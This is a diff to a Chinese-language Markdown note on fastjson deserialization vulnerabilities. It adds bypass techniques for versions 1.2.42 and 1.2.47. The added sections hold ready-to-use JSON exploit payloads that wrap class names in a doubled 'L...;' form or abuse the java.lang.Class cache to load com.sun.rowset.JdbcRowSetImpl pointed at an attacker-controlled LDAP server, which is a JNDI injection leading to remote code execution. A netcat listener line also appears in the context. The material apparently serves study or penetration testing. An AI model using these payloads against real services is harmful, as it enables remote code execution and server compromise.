@@ -68,16 +68,36 @@ nc -lv 443
 ### 1.2.42版本绕过
 fastjson在1.2.42版本新增了校验机制。如果输入类名的开头和结尾是L和;就将头尾去掉再进行黑名单校验。绕过方法：在类名外部嵌套两层L和;。
 原类名：```com.sun.rowset.JdbcRowSetImpl```
+
 绕过：```LLcom.sun.rowset.JdbcRowSetImpl;;```
+
 EXP：
+
 ```bash
 {           
 	"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
-	"dataSourceName":"ldap://x.x.x.x:1389/JNDIObject",
+	"dataSourceName":"ldap://ip:1389/JNDIObject",
 	"autoCommit":true
 }
 ```
 > autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）
+
+### 1.2.47版本绕过
+在1.2.47版本及以下的情况下，loadClass中默认cache为true，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl这个类，即可绕过黑名单
+
+```bash
+{
+	"a": { 
+		"@type":"java.lang.Class",
+		"val": "com.sun.rowset.JdbcRowSetImpl"
+	},
+	"b": { 
+		"@type":"com.sun.rowset.JdbcRowSetImpl",
+		"dataSourceName":"ldap://ip:1389/JNDIObject",
+		"autoCommit":true
+	}
+}
+```
 
 ## 漏洞原理：
 
